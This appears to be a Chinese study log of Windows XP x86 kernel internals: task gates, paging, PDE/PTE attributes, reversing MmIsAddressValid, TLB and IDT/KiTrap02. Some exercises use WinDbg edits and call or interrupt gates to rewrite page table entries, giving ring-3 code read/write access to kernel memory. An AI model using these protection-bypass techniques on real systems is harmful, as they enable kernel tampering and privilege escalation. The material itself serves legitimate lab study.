\u003cstdlib.h\u003e DWORD dwOK; DWORD dwESP; DWORD dwCS; void __declspec(naked) test() { __asm { mov eax,esp; mov dwESP,eax; mov word ptr [dwCS],cs; iretd; } } int main(int argc,char * argv[]) { char stack[100]={0}; //自己构造一个堆栈使用 DWORD cr3=0; DWORD addr=0; char buffer[6]={0}; //构造任务段 DWORD tss[0x68]={ 0x0, //link 0x0, //esp0 0x0, //ss0 0x0, //esp1 0x0, //ss1 0x0, //esp2 0x0, //ss2 0, //cr3 * (DWORD)addr, //eip * 0, //eflags 0, //eax 0, //ecx 0, //edx 0, //ebx ((DWORD)stack) + 100, //esp * 0, //ebp 0, //esi 0, //edi 0x23, //es * 0xB1, //cs * 0xB9, //ss * 0x23, //ds * 0xC1, //fs * 0, //gs 0, //idt 0x20ac0000 //IO权限位图，VISTA之后不再用了，从其他结构体拷贝出来。 }; printf(\"Target:\\n\"); scanf(\"%x\",\u0026addr); tss[8]=addr; printf(\"tss：%x\\n\",tss); printf(\"CR3:\\n\"); scanf(\"%x\",\u0026cr3); //看准了DirBase: tss[7]=cr3; *(WORD*)(\u0026buffer[4])=0xDB; __asm { call fword ptr [buffer]; } printf(\"dwESP=%x\\tdwCS=%x\\n\",dwESP,dwCS); system(\"pause\"); return 0; } 10-10-12分页 找物理地址\n使用ce查找记事本进程中的字符串，修改记事本中的字符串以找到真正的字符串的地址。\n先将这个地址进行10-10-12分页（比如我的地址是：000AB3A0）\n转成二进制：0000 0000 00|00 1010 1011 3A0\n那么这两组的值为：0，AB 加上后面的 3A0\n将第二组值×4：0，AB*4，3A0\n这三组就是三个页的offset\n在windbg中使用指令！process 0 0，查看notepad的Cr3，就是那个DirBase的值\n使用指令！dd [地址] 读取线性地址，这个地址就是Cr3的值加上第一个offset，找到的是第二个页的地址（后三位067改为0才是地址，067是属性），第二个页的地址加上第二个offset，找到的是物理页的地址（后三位067改为0才是地址），物理页的地址加上第三个offset，找到的就是字符串的物理地址。\n创建两个进程，申请一个相同的内存地址，比如: 0x401234，并存储不同的内容，分别找到这2个进程相对应的物理地址，看内容是什么？说说你的理解\nPDE_PTE 线性地址0为什么不能访问？将0地址设置为可读可写。\n比如我观察一个进程的Cr3，PDT与PTT，如下：\nPROCESS 89c25be0 SessionId: 0 Cid: 0674 Peb: 7ffd9000 ParentCid: 05c4 DirBase: 1cd3e000 ObjectTable: e2848690 HandleCount: 50. Image: notepad.exe kd\u003e !dd 1cd3e000 #1cd3e000 1cdb0867 1d261867 1cfb1867 00000000 #1cd3e010 1cfe3867 00000000 00000000 00000000 #1cd3e020 00000000 00000000 00000000 00000000 #1cd3e030 00000000 00000000 00000000 00000000 #1cd3e040 00000000 00000000 00000000 00000000 #1cd3e050 00000000 00000000 00000000 00000000 #1cd3e060 00000000 00000000 00000000 00000000 #1cd3e070 00000000 00000000 00000000 00000000 kd\u003e !dd 1cdb0000 #1cdb0000 00000000 00000000 00000000 00000000 #1cdb0010 00000000 00000000 00000000 00000000 #1cdb0020 00000000 00000000 00000000 00000000 #1cdb0030 00000000 00000000 00000000 00000000 #1cdb0040 1ce71867 00000000 00000000 00000000 #1cdb0050 00000000 00000000 00000000 00000000 #1cdb0060 00000000 00000000 00000000 00000000 #1cdb0070 00000000 00000000 00000000 00000000 可以看到，进程中线性地址0的PTT为0，也就是PTE中的P位为0，表示PTE无效，所以不能被访问，但是PDE是有效的，所以可以重新改一个有效的PTE就可以访问了吧。\n代码如下：\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e int main() { int x=1; printf(\"x：%x\\n\",\u0026x); getchar(); //向0地址写入数据 *(int*)0 = 123; printf(\"x地址数据:%x\\n\",*(int*)0); getchar(); return 0; } 过程如下：\n0012ff7c 0000 0000 0001 0010 1111 f7c 1：0 2：4BC 3：f7c Failed to get VadRoot PROCESS 89b9f558 SessionId: 0 Cid: 05b8 Peb: 7ffdd000 ParentCid: 0180 DirBase: 27943000 ObjectTable: e1085490 HandleCount: 12. Image: 111.exe kd\u003e !dd 27943000 #27943000 27872867 27971867 00000000 00000000 #27943010 00000000 00000000 00000000 00000000 #27943020 00000000 00000000 00000000 00000000 #27943030 00000000 00000000 00000000 00000000 #27943040 00000000 00000000 00000000 00000000 #27943050 00000000 00000000 00000000 00000000 #27943060 00000000 00000000 00000000 00000000 #27943070 00000000 00000000 00000000 00000000 kd\u003e !dd 27872000 #27872000 00000000 00000000 00000000 00000000 #27872010 00000000 00000000 00000000 00000000 #27872020 00000000 00000000 00000000 00000000 #27872030 00000000 00000000 00000000 00000000 #27872040 279f3867 00000000 00000000 00000000 #27872050 00000000 00000000 00000000 00000000 #27872060 00000000 00000000 00000000 00000000 #27872070 00000000 00000000 00000000 00000000 kd\u003e !dd 27872000+4BC #278724bc 27877867 16360025 16361025 00000000 #278724cc 00000000 00000000 00000000 00000000 #278724dc 00000000 00000000 00000000 00000000 #278724ec 00000000 00000000 00000000 00000000 #278724fc 00000000 279fb867 27abc867 27c7d867 #2787250c 00000000 00000000 00000000 00000000 #2787251c 00000000 00000000 00000000 00000000 #2787252c 00000000 00000000 00000000 00000000 kd\u003e !ed 27872000 27877867 输出结果：x地址数据:7b 为变量x再映射一个线性地址，并通过这个新的地址读取x的值。\n代码如下：\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e int main() { int x=1; int y[1024]={0}; printf(\"x：%x\\n\",\u0026x); printf(\"y：%x\\n\",\u0026y); getchar(); printf(\"x地址数据:%x\\n\",x); getchar(); return 0; } x:0012ff7c 0000 0000 0001 0010 1111 f7c 1：0 2：4BC 3：f7c y:0012ef7c 0000 0000 0001 0010 1110 f7c 1：0 2：4B8 3：f7c 将x的PDE改为y的，过程如下：\nFailed to get VadRoot PROCESS 89c1d7e8 SessionId: 0 Cid: 052c Peb: 7ffd3000 ParentCid: 079c DirBase: 20ff4000 ObjectTable: e28b0ad8 HandleCount: 12. Image: 111.exe kd\u003e !dd 20ff4000 #20ff4000 20e5d867 20d9c867 00000000 00000000 #20ff4010 00000000 00000000 00000000 00000000 #20ff4020 00000000 00000000 00000000 00000000 #20ff4030 00000000 00000000 00000000 00000000 #20ff4040 00000000 00000000 00000000 00000000 #20ff4050 00000000 00000000 00000000 00000000 #20ff4060 00000000 00000000 00000000 00000000 #20ff4070 00000000 00000000 00000000 00000000 kd\u003e !dd 20e5d000+4b8 #20e5d4b8 210c8867 20ffb867 163df025 16420025 #20e5d4c8 00000000 00000000 00000000 00000000 #20e5d4d8 00000000 00000000 00000000 00000000 #20e5d4e8 00000000 00000000 00000000 00000000 #20e5d4f8 00000000 00000000 20dff867 21300867 #20e5d508 20f81867 00000000 00000000 00000000 #20e5d518 00000000 00000000 00000000 00000000 #20e5d528 00000000 00000000 00000000 00000000 kd\u003e !ed 20e5d4bc 210c8867 但是不知道为什么，修改完，执行后会蓝屏＞︿＜\n10-10-12分页模式物理内存能够识别的最多范围是多少?\n1024 *1024 *4096 ==一共4GB\n如何判断2个线性地址是否在同一个物理页？\n物理地址除了最后三位以外其他的位数都相等，就是同一物理页\nPDE_PTE属性 在VC6中定义一个字符串常量 通过另外一个线性地址修改这个常量的值 代码如下：\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e char* a=\"c65mael\"; int main(int argc, char* argu[]) { printf(\"%x\",a); getchar(); a[1]='a'; printf(\"%s\",a); getchar(); return 0; } a:0042201c 0000 0000 0100 0010 0010 01c 1：1*4 2：22*4 3：01c 过程如下：\nFailed to get VadRoot PROCESS 89e63020 SessionId: 0 Cid: 0520 Peb: 7ffd9000 ParentCid: 07cc DirBase: 2ff55000 ObjectTable: e1babc00 HandleCount: 12. Image: 111.exe kd\u003e !dd 2ff55000+4 #2ff55004 2ffd9867 00000000 00000000 00000000 #2ff55014 00000000 00000000 00000000 00000000 #2ff55024 00000000 00000000 00000000 00000000 #2ff55034 00000000 00000000 00000000 00000000 #2ff55044 00000000 00000000 00000000 00000000 #2ff55054 00000000 00000000 00000000 00000000 #2ff55064 00000000 00000000 00000000 00000000 #2ff55074 00000000 00000000 00000000 00000000 kd\u003e !dd 2ffd9000+88 #2ffd9088 30085025 00000000 301d2867 30488225 #2ffd9098 00000000 3024b867 3040d867 30413867 #2ffd90a8 303f2825 00000000 00000000 00000000 #2ffd90b8 00000000 00000000 00000000 00000000 #2ffd90c8 00000000 00000000 00000000 00000000 #2ffd90d8 00000000 00000000 00000000 00000000 #2ffd90e8 00000000 00000000 00000000 00000000 #2ffd90f8 00000000 00000000 00000000 00000000 kd\u003e !ed 2ffd9088 30085027 修改0x8003F00C这个地址的PDE PTE属性使之可以在3环访问\n代码如下：\n#include \u003cWindows.h\u003e #include \u003cstdlib.h\u003e int main(int argc, char* argu[]) { int x=0x8003F00C; getchar(); printf(\"%x\",*(int*)a); return 0; } 8003F00C 1000 0000 0000 0011 1111 00c 1：200*4 2：3f*4 3：00c 过程如下：\nFailed to get VadRoot PROCESS 897b1518 SessionId: 0 Cid: 032c Peb: 7ffd9000 ParentCid: 02dc DirBase: 227cc000 ObjectTable: e28a8448 HandleCount: 12. Image: 111.exe kd\u003e !dd 227cc000+800 #227cc800 0003b163 004009e3 0003e163 0003c163 #227cc810 010009e3 014009e3 018009e3 01c009e3 #227cc820 020009e3 024009e3 028009e3 02c009e3 #227cc830 030009e3 034009e3 038009e3 03c009e3 #227cc840 040009e3 044009e3 048009e3 04c009e3 #227cc850 050009e3 054009e3 058009e3 05c009e3 #227cc860 060009e3 064009e3 068009e3 06c009e3 #227cc870 070009e3 074009e3 078009e3 07c009e3 kd\u003e !ed 227cc800 0003b167 kd\u003e !dd 0003b0fc # 3b0fc 0003f167 00040103 00041103 00042163 # 3b10c 00043163 00044163 00000000 00000000 # 3b11c 00000000 00000000 00000000 00000000 # 3b12c 00000000 00000000 00000000 00000000 # 3b13c 00000000 00000000 00000000 00000000 # 3b14c 00000000 00000000 00000000 00000000 # 3b15c 00000000 00000000 00000000 00000000 # 3b16c 00000000 00000000 00000000 00000000 kd\u003e !ed 3b0fc 0003f867 思考题：一个线性地址如果可以访问，一定要填上正确的PDE和PTE，但PDE与PTE是物理地址，如果我们想填充，那又必须要通过线性地址才能去访问，谁为访问PDE与PTE的线性地址填充争取的PDE与PTE呢?\nCPU通过“页表”来找到内存中的数据，而“页表”本身也放在内存里。你想访问页表时，也得先通过页表来找到页表的位置。这听起来像是“先有鸡还是先有蛋”的问题。 实际上，系统有个聪明的办法：它把“页表”自己也放到它管理的地址里面！就好像给“页表”留了一面镜子，这样你就可以通过这个镜子（一个特殊的地址）看到并访问页表本身。这样，CPU就可以通过这个自带的“镜子”来先找到页表，然后再去管理其他的内存数据。 所以，是操作系统给页表设置了一个特殊的“镜子”地址，这样即使你要找页表，它也能让你找到。 PDT:0xc0300000 创建2个进程，以页为代码拆分0-4G线性地址\n结果：\n低2G（0-7FFFFFFF）几乎不同 高2G（80000000-FFFFFFFF）几乎相同 0-7FFFFFFF的前64K和后64k都是没有映射的 PDT_PTT基址 逆向分析MmIsAddressValid函数\n804e2f46 8bff mov edi,edi 804e2f48 55 push ebp ;保护现场 804e2f49 8bec mov ebp,esp 804e2f4b 8b4d08 mov ecx,dword ptr [ebp+8] ;取一个栈上的值做参数(VirtualAddress) 804e2f4e 8bc1 mov eax,ecx ;eax=VirtualAddress 804e2f50 c1e814 shr eax,14h ;eax右移20位，保留高12位 804e2f53 bafc0f0000 mov edx,0FFCh ;edx=0xffc(1111 1111 1100) 804e2f58 23c2 and eax,edx ;不要低两位，也就是第一个10 804e2f5a 2d0000d03f sub eax,-0C0300000h ;eax+0xC0300000，页目录表 804e2f5f 8b00 mov eax,dword ptr [eax] ;取eax地址的值。也就是PDE 804e2f61 a801 test al,1 ;判断p位是否为1 804e2f63 0f844e3e0100 je nt!MmIsAddressValid+0x4f (804f6db7) 804e2f69 84c0 test al,al ;判断ps位,是否为大页(因为第7位为1时会被认为负数) 804e2f6b 7824 js nt!MmIsAddressValid+0x53 (804e2f91) 804e2f6d c1e90a shr ecx,0Ah ;ecx右移10位,保留高20位 804e2f70 81e1fcff3f00 and ecx,3FFFFCh ;去高两位与低两位 804e2f76 81e900000040 sub ecx,-0C0000000h ;eax+0xC0000000，页表 804e2f7c 8bc1 mov eax,ecx 804e2f7e 8b08 mov ecx,dword ptr [eax] ;取eax地址的值。也就是PTE 804e2f80 f6c101 test cl,1 ;判断p位是否为1 804e2f83 0f842e3e0100 je nt!MmIsAddressValid+0x4f (804f6db7) 804e2f89 84c9 test cl,cl ;判断PAT位 804e2f8b 0f88d5410400 js nt!MmIsAddressValid+0x3f (80527166) 804e2f91 b001 mov al,1 804e2f93 5d pop ebp 804e2f94 c20400 ret 4 2-9-9-12分页 在2-9-9-12分页模式下进行线性地址到物理地址的转换\n代码如下：\n#include \u003cWindows.h\u003e #include \u003cstdio.h\u003e int main(int argc, char* argu[]) { int a=10; printf(\"%x\",\u0026a); getchar(); printf(\"%x\",a); return 0; } 0x0012ff7c 0000 0000 00|01 0010 1111 f7c 1:0 2:12f*8（一定注意） 3:f7c 过程如下：\nFailed to get VadRoot PROCESS 8a316be0 SessionId: 0 Cid: 017c Peb: 7ffda000 ParentCid: 0584 DirBase: 0aac0380 ObjectTable: e272aec0 HandleCount: 12. Image: 111.exe kd\u003e !dd 0aac0380 # aac0380 225ad801 00000000 226ee801 00000000（这个就是PDPTE，不是只有4个吗？） # aac0390 227af801 00000000 2236c801 00000000 # aac03a0 bae713c0 00000000 21da9801 00000000 # aac03b0 21bea801 00000000 21ca7801 00000000 # aac03c0 bae713e0 00000000 00000000 00000000 # aac03d0 00000000 00000000 00000000 00000000 # aac03e0 bae71400 00000000 00000000 00000000 # aac03f0 00000000 00000000 00000000 00000000 kd\u003e !dd 225ad000 #225ad000 22471867 00000000 227d4867 00000000 #225ad010 225f0867 00000000 00000000 00000000 #225ad020 00000000 00000000 00000000 00000000 #225ad030 00000000 00000000 00000000 00000000 #225ad040 00000000 00000000 00000000 00000000 #225ad050 00000000 00000000 00000000 00000000 #225ad060 00000000 00000000 00000000 00000000 #225ad070 00000000 00000000 00000000 00000000 kd\u003e !dd 22471000+12f*8 #22471978 2270d867 80000000 16fff025 80000000 #22471988 17400025 80000000 00000000 00000000 #22471998 00000000 00000000 00000000 00000000 #224719a8 00000000 00000000 00000000 00000000 #224719b8 00000000 00000000 00000000 00000000 #224719c8 00000000 00000000 00000000 00000000 #224719d8 00000000 00000000 00000000 00000000 #224719e8 00000000 00000000 00000000 00000000 kd\u003e !dd 2270d000+f7c #2270df7c 0000000a 0012ffc0 00401299 00000001 #2270df8c 00380d60 00380df8 00000000 00000000 #2270df9c 7ffda000 00000001 00000001 0012ff94 #2270dfac b13f8d08 0012ffe0 00404440 00423130 #2270dfbc 00000000 0012fff0 7c817067 00000000 #2270dfcc 00000000 7ffda000 8054c6ed 0012ffc8 #2270dfdc 8a162980 ffffffff 7c839ac0 7c817070 #2270dfec 00000000 00000000 00000000 004011b0 kd\u003e !ed 2270df7c 9 kd\u003e !dd 2270d000+f7c #2270df7c 00000009 0012ffc0 00401299 00000001 #2270df8c 00380d60 00380df8 00000000 00000000 #2270df9c 7ffda000 00000001 00000001 0012ff94 #2270dfac b13f8d08 0012ffe0 00404440 00423130 #2270dfbc 00000000 0012fff0 7c817067 00000000 #2270dfcc 00000000 7ffda000 8054c6ed 0012ffc8 #2270dfdc 8a162980 ffffffff 7c839ac0 7c817070 #2270dfec 00000000 00000000 00000000 004011b0 给0线性地址挂上物理页。\n代码如下：\n#include \u003cWindows.h\u003e #include \u003cstdio.h\u003e int main(int argc, char* argu[]) { int *a=0; int b = 8888; printf(\"%x\",\u0026b); getchar(); printf(\"%x\",*a); getchar(); return 0; } 0x12ff78 0000 0000 0001 0010 1111 f78 1:0 2:12f*8 3:f78 过程如下：\nFailed to get VadRoot PROCESS 8a3f68d8 SessionId: 0 Cid: 0210 Peb: 7ffd3000 ParentCid: 06fc DirBase: 0aac03a0 ObjectTable: e1396468 HandleCount: 12. Image: 111.exe kd\u003e !dd 0aac03a0 # aac03a0 3071b801 00000000 3095c801 00000000 # aac03b0 3075d801 00000000 3085a801 00000000 # aac03c0 bae713e0 00000000 00000000 00000000 # aac03d0 00000000 00000000 00000000 00000000 # aac03e0 bae71400 00000000 00000000 00000000 # aac03f0 00000000 00000000 00000000 00000000 # aac0400 bae71420 00000000 00000000 00000000 # aac0410 00000000 00000000 00000000 00000000 kd\u003e !dd 3071b000 #3071b000 3079d867 00000000 30a69867 00000000 #3071b010 3099c867 00000000 00000000 00000000 #3071b020 00000000 00000000 00000000 00000000 #3071b030 00000000 00000000 00000000 00000000 #3071b040 00000000 00000000 00000000 00000000 #3071b050 00000000 00000000 00000000 00000000 #3071b060 00000000 00000000 00000000 00000000 #3071b070 00000000 00000000 00000000 00000000 kd\u003e !dd 3079d000+12f*8 #3079d978 307e2867 80000000 16cae025 80000000 #3079d988 16caf025 80000000 00000000 00000000 #3079d998 00000000 00000000 00000000 00000000 #3079d9a8 00000000 00000000 00000000 00000000 #3079d9b8 00000000 00000000 00000000 00000000 #3079d9c8 00000000 00000000 00000000 00000000 #3079d9d8 00000000 00000000 00000000 00000000 #3079d9e8 00000000 00000000 00000000 00000000 kd\u003e !dd 307e2000+f78 #307e2f78 000022b8 00000000 0012ffc0 004012a9 #307e2f88 00000001 00380d60 00380df8 00000000 #307e2f98 00000000 7ffd3000 00000001 00000001 #307e2fa8 0012ff94 b1de6d08 0012ffe0 00404450 #307e2fb8 00423130 00000000 0012fff0 7c817067 #307e2fc8 00000000 00000000 7ffd3000 8054c6ed #307e2fd8 0012ffc8 8a402da8 ffffffff 7c839ac0 #307e2fe8 7c817070 00000000 00000000 00000000 kd\u003e !dd 0aac03a0 # aac03a0 3071b801 00000000 3095c801 00000000 # aac03b0 3075d801 00000000 3085a801 00000000 # aac03c0 bae713e0 00000000 00000000 00000000 # aac03d0 00000000 00000000 00000000 00000000 # aac03e0 bae71400 00000000 00000000 00000000 # aac03f0 00000000 00000000 00000000 00000000 # aac0400 bae71420 00000000 00000000 00000000 # aac0410 00000000 00000000 00000000 00000000 kd\u003e !dd 3079d000 #3079d000 00000000 00000000 00000000 00000000 #3079d010 00000000 00000000 00000000 00000000 #3079d020 00000000 00000000 00000000 00000000 #3079d030 00000000 00000000 00000000 00000000 #3079d040 00000000 00000000 00000000 00000000 #3079d050 00000000 00000000 00000000 00000000 #3079d060 00000000 00000000 00000000 00000000 #3079d070 00000000 00000000 00000000 00000000 kd\u003e !ed 3079d000 307e2867 逆向分析MmisAddressValid函数，找到PAE分页模式下页目录表、页表基址。\n80514928 8bff mov edi,edi 8051492a 55 push ebp 8051492b 8bec mov ebp,esp 8051492d 51 push ecx 8051492e 51 push ecx 8051492f 8b4d08 mov ecx,dword ptr [ebp+8] 80514932 56 push esi 80514933 8bc1 mov eax,ecx 80514935 c1e812 shr eax,12h #右移18位 80514938 bef83f0000 mov esi,3FF8h 8051493d 23c6 and eax,esi #进行与运算，0011 1111 1111 1000 剩11位 8051493f 2d0000a03f sub eax,3FA00000h #eax+0xC0600000 80514944 8b10 mov edx,dword ptr [eax] #取PDE低四字节 80514946 8b4004 mov eax,dword ptr [eax+4] #取PDE高四字节 80514949 8945fc mov dword ptr [ebp-4],eax 8051494c 8bc2 mov eax,edx 8051494e 57 push edi 8051494f 83e001 and eax,1 80514952 33ff xor edi,edi 80514954 0bc7 or eax,edi 80514956 7461 je nt!MmIsAddressValid+0x91 (805149b9) 80514958 bf80000000 mov edi,80h 8051495d 23d7 and edx,edi 8051495f 6a00 push 0 80514961 8955f8 mov dword ptr [ebp-8],edx 80514964 58 pop eax 80514965 7404 je nt!MmIsAddressValid+0x43 (8051496b) 80514967 85c0 test eax,eax 80514969 7452 je nt!MmIsAddressValid+0x95 (805149bd) 8051496b c1e909 shr ecx,9 #右移9位 8051496e 81e1f8ff7f00 and ecx,7FFFF8h #进行与运算，0111 1111 1111 1111 1111 1000 剩20位 80514974 8b81040000c0 mov eax,dword ptr [ecx-3FFFFFFCh] #mov eax, [ecx+0xC0000004] 8051497a 81e900000040 sub ecx,40000000h #ecx+0xC0000000 80514980 8b11 mov edx,dword ptr [ecx] #取PTE低四字节 80514982 8945fc mov dword ptr [ebp-4],eax #高4位在栈上 80514985 53 push ebx 80514986 8bc2 mov eax,edx 80514988 33db xor ebx,ebx 8051498a 83e001 and eax,1 8051498d 0bc3 or eax,ebx 8051498f 5b pop ebx 80514990 7427 je nt!MmIsAddressValid+0x91 (805149b9) 80514992 23d7 and edx,edi 80514994 6a00 push 0 80514996 8955f8 mov dword ptr [ebp-8],edx 80514999 58 pop eax 8051499a 7421 je nt!MmIsAddressValid+0x95 (805149bd) 8051499c 85c0 test eax,eax 8051499e 751d jne nt!MmIsAddressValid+0x95 (805149bd) 805149a0 23ce and ecx,esi 805149a2 8b89000060c0 mov ecx,dword ptr [ecx-3FA00000h] 805149a8 b881000000 mov eax,81h 805149ad 23c8 and ecx,eax 805149af 33d2 xor edx,edx 805149b1 3bc8 cmp ecx,eax 805149b3 7508 jne nt!MmIsAddressValid+0x95 (805149bd) 805149b5 85d2 test edx,edx 805149b7 7504 jne nt!MmIsAddressValid+0x95 (805149bd) 805149b9 32c0 xor al,al 805149bb eb02 jmp nt!MmIsAddressValid+0x97 (805149bf) 805149bd b001 mov al,1 805149bf 5f pop edi 805149c0 5e pop esi 805149c1 c9 leave 805149c2 c20400 ret 4 修改页属性，实现应用层读写高2G内存地址。\n测试代码如下：\n#include \u003cstdio.h\u003e #include\u003cwindows.h\u003e char buf[6]={0,0,0,0,0x48,0}; DWORD *GetPDE(DWORD addr) { //return (DWORD *)(0xc0600000 + ((addr \u003e\u003e 18) \u0026 0x3ff8)); DWORD PDPTI = addr \u003e\u003e 30; DWORD PDI = (addr \u003e\u003e 21) \u0026 0x000001FF; DWORD PTI = (addr \u003e\u003e 12) \u0026 0x000001FF; return (DWORD *)(0xC0600000 + PDPTI * 0x1000 + PDI * 8); } DWORD *GetPTE(DWORD addr) { //return (DWORD *)(0xc0000000 + ((addr \u003e\u003e 9) \u0026 0x7ffff8)); DWORD PDPTI = addr \u003e\u003e 30; DWORD PDI = (addr \u003e\u003e 21) \u0026 0x000001FF; DWORD PTI = (addr \u003e\u003e 12) \u0026 0x000001FF; return (DWORD *)(0xC0000000 + PDPTI * 0x200000 + PDI * 0x1000 + PTI * 8); } __declspec(naked) void func() { __asm { pushad pushfd } *GetPDE(0x8003f048) |=0x00000004; *GetPTE(0x8003f048) |=0x00000004; *GetPTE(0x8003f048) \u0026= 0xFFFFFEFF; __asm { popad popfd iretd } } int main(int argc, char* argv[]) { printf(\"%x\",(DWORD)func); getchar(); __asm int 0x20; printf(\"0x8003f048 U/S,G位修改成功.\\n\"); printf(\"*(PDWORD)0x8003f048 = %08x\\n\", *(PDWORD)0x8003f048); *(PDWORD)0x8003f048 = 0x12345678; printf(\"*(PDWORD)0x8003f048 = %08x\\n\", *(PDWORD)0x8003f048); getchar(); return 0; } TLB 测试这个结构\n代码如下：\n//10-10-12下的 #include \u003cwindows.h\u003e #include \u003cstdio.h\u003e DWORD TempFnAddress; void __declspec(naked) Proc()//401030 { _asm { mov dword ptr ds:[0xc0000000],0x1234967 mov dword ptr ds:[0],0x12345876 //INVLPG dword ptr ds:[0] //mov eax,cr3 //mov cr3,eax mov dword ptr ds:[0xc0000000],0x0234567 mov eax,dword ptr ds:[0] mov TempFnAddress,eax retf } } int main(int argc, char* argv[]) { char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, 废弃 *(WORD*)\u0026buff[4] = 0x48; // 段选择子 _asm { call far fword ptr[buff]//eq 8003f048 0040EC00`00081030 } printf(\"%x\\n\",TempFnAddress); getchar(); return 0; } 中断与异常 kd\u003e dq idtr 8003f400 804d8e00`0008f50e 804d8e00`0008f68d 8003f410 00008500`0058113e 804dee00`0008faa1 8003f420 804dee00`0008fc24 804d8e00`0008fd89 8003f430 804d8e00`0008ff0a 804e8e00`00080583 8003f440 00008500`00501198 804e8e00`00080988 8003f450 804e8e00`00080aa6 804e8e00`00080be3 8003f460 804e8e00`00080e40 804e8e00`0008113c 8003f470 804e8e00`00081867 804e8e00`00081b9c kd\u003e dq gdtr 8003f000 00000000`00000000 00cf9b00`0000ffff 8003f010 00cf9300`0000ffff 00cffb00`0000ffff 8003f020 00cff300`0000ffff 80008b04`200020ab 8003f030 ffc093df`f0000001 7f40f3fd`f0000fff 8003f040 0000f200`0400ffff 0040ec00`00081020 8003f050 80008955`87000068 80008b55`87680068 8003f060 00009302`2f40ffff 0000920b`80003fff 8003f070 ff0092ff`700003ff 80009a40`0000ffff 师傅说这个FS寄存器里面有一个结构体如下：\ndt _KPCR ffdff000 nt!_KPCR +0x000 NtTib : _NT_TIB +0x01c SelfPcr : 0xffdff000 _KPCR +0x020 Prcb : 0xffdff120 _KPRCB +0x024 Irql : 0x1c '' +0x028 IRR : 0 +0x02c IrrActive : 0 +0x030 IDR : 0xffff20f8 +0x034 KdVersionBlock : 0x80546ab8 Void +0x038 IDT : 0x8003f400 _KIDTENTRY +0x03c GDT : 0x8003f000 _KGDTENTRY +0x040 TSS : 0x80042000 _KTSS +0x044 MajorVersion : 1 +0x046 MinorVersion : 1 +0x048 SetMember : 1 +0x04c StallScaleFactor : 0x64 +0x050 DebugActive : 0 '' +0x051 Number : 0 '' +0x052 Spare0 : 0 '' +0x053 SecondLevelCacheAssociativity : 0 '' +0x054 VdmAlert : 0 +0x058 KernelReserved : [14] 0 +0x090 SecondLevelCacheSize : 0 +0x094 HalReserved : [16] 0 +0x0d4 InterruptMode : 0 +0x0d8 Spare1 : 0 '' +0x0dc KernelReserved2 : [17] 0 +0x120 PrcbData : _KPRCB 分析IDT表中0x2号中断的执行流程。\n00008500`0058113e 58 = 0101 1 000 index = 11(找gdt表的索引) 80008b55`87680068 address = 80558768 kd\u003e dd 80558768 80558768 00000028 80555700 00000010 00000000 80558778 00000000 00000000 00000000 00039000 80558788 804df780 00000000 00000000 00000000 80558798 00000000 00000000 80555700 00000000 805587a8 00000000 00000000 00000023 00000008 805587b8 00000010 00000023 00000030 00000000 805587c8 00000000 20ac0000 00000000 00000000 805587d8 80555668 00000000 00000001 0000000a 这个是个任务段，找到在TSS里面的eip，那么eip = 804df780，在反汇编窗口看一下地址 nt!KiTrap02: ffffffff`804df780 fa cli ;屏蔽可屏蔽中断 ffffffff`804df781 64ff3540000000 push dword ptr fs:[40h] ;TSS ffffffff`804df788 64a13c000000 mov eax, dword ptr fs:[0000003Ch] ;GDT ffffffff`804df78e 8a685f mov ch, byte ptr [eax+5Fh] ffffffff`804df791 8a485c mov cl, byte ptr [eax+5Ch] ffffffff`804df794 c1e110 shl ecx, 10h ffffffff`804df797 668b485a mov cx, word ptr [eax+5Ah] ffffffff`804df79b 64890d40000000 mov dword ptr fs:[40h], ecx ;改TSS ffffffff`804df7a2 9c pushfd ffffffff`804df7a3 812424ffbfffff and dword ptr [esp], 0FFFFBFFFh ffffffff`804df7aa 9d popfd ffffffff`804df7ab 648b0d3c000000 mov ecx, dword ptr fs:[3Ch] ffffffff`804df7b2 8d4158 lea eax, [ecx+58h] ffffffff`804df7b5 c6400589 mov byte ptr [eax+5], 89h ffffffff`804df7b9 8b0424 mov eax, dword ptr [esp] ffffffff`804df7bc 6a00 push 0 ffffffff`804df7be 6a00 push 0 ffffffff`804df7c0 6a00 push 0 ffffffff`804df7c2 6a00 push 0 ffffffff`804df7c4 ff7050 push dword ptr [eax+50h] ffffffff`804df7c7 ff7038 push dword ptr [eax+38h] ffffffff`804df7ca ff7024 push dword ptr [eax+24h] ffffffff`804df7cd ff704c push dword ptr [eax+4Ch] ffffffff`804df7d0 ff7020 push dword ptr [eax+20h] ffffffff`804df7d3 6a00 push 0 ffffffff`804df7d5 ff703c push dword ptr [eax+3Ch] ffffffff`804df7d8 ff7034 push dword ptr [eax+34h] ffffffff`804df7db ff7040 push dword ptr [eax+40h] ffffffff`804df7de ff7044 push dword ptr [eax+44h] ffffffff`804df7e1 ff7058 push dword ptr [eax+58h] ffffffff`804df7e4 64ff3500000000 push dword ptr fs:[0] ffffffff`804df7eb 6aff push 0FFFFFFFFh ffffffff`804df7ed ff7028 push dword ptr [eax+28h] ffffffff`804df7f0 ff702c push dword ptr [eax+2Ch] ffffffff`804df7f3 ff7030 push dword ptr [eax+30h] ffffffff`804df7f6 ff7054 push dword ptr [eax+54h] ffffffff`804df7f9 ff7048 push dword ptr [eax+48h] ffffffff`804df7fc ff705c push dword ptr [eax+5Ch] ffffffff`804df7ff 6a00 push 0 ffffffff`804df801 6a00 push 0 ffffffff`804df803 6a00 push 0 ffffffff`804df805 6a00 push 0 ffffffff`804df807 6a00 push 0 ffffffff`804df809 6a00 push 0 ffffffff`804df80b 6a00 push 0 ffffffff`804df80d 6a00 push 0 ffffffff`804df80f 6a00 push 0 ffffffff`804df811 6a00 push 0 ffffffff`804df813 ff7020 push dword ptr [eax+20h] ffffffff`804df816 ff703c push dword ptr [eax+3Ch] ffffffff`804df819 8bec mov ebp, esp ffffffff`804df81b 33db xor ebx, ebx ffffffff`804df81d 648a1d51000000 mov bl, byte ptr fs:[51h] ffffffff`804df824 391ddc875580 cmp dword ptr ds:[805587DCh], ebx ffffffff`804df82a 7414 je ntkrnlmp!_KiTrap02+0xc0 (804df840) ffffffff`804df82c 8d05d8875580 lea eax, ds:[805587D8h] ffffffff`804df832 50 push eax ffffffff`804df833 6a00 push 0 ffffffff`804df835 8bcc mov ecx, esp ffffffff`804df837 8bd5 mov edx, ebp ffffffff`804df839 e8979f0500 call ntkrnlmp!@KiAcquireQueuedSpinLockCheckForFreeze@8 (805397d5) ffffffff`804df83e eb24 